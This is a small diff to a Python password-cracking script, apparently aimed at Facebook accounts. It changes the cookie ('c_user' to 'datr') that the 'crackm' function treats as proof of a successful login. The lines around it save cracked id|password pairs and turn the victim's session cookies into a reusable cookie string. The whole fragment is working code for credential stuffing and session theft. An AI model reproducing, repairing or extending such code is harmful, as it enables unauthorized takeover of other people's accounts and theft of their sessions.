@@ -629,7 +629,7 @@ def crackm(idf,pwv):
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
-			elif "c_user" in ses.cookies.get_dict().keys():
+			elif "datr" in ses.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
